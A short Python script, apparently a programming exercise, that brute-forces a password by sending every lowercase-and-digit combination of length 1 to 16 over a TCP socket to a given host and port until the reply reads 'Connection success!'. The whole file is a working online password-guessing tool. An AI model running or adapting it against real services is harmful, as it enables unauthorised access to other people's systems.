import itertools
import socket
import sys
import string
from typing import Iterable, Generator


def brute_force(charset: Iterable, minlength: int, maxlength: int) -> Generator:
    """Takes an iterable object with a sequence of possible characters.
        Minimum and maximum combination length.
        Returns a generator that will sort all possible combinations"""
    return (''.join(char)
            for char in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
                                                      for i in range(minlength, maxlength + 1)))


def send_data(connection, password_generator: Generator, success_message: str = 'Connection success!') -> str:
    """Takes the connection, generator, and message that is expected to be received on success.
        Sends the elements generated by the generator to the connection, listens for the response,
        when it receives a success message in response, returns the generated object."""
    for password in password_generator:
        encoded_password = password.encode()
        connection.send(encoded_password)
        response = connection.recv(1024)
        response = response.decode()
        if response == success_message:
            return password


def main():
    ip_address = sys.argv[1]
    port = int(sys.argv[2])
    address = (ip_address, port)
    charset = string.ascii_lowercase + string.digits
    password_generator = brute_force(charset, 1, 16)

    with socket.socket() as connection:
        connection.connect(address)
        correct_password = send_data(connection, password_generator)
        print(correct_password)


if __name__ == '__main__':
    main()
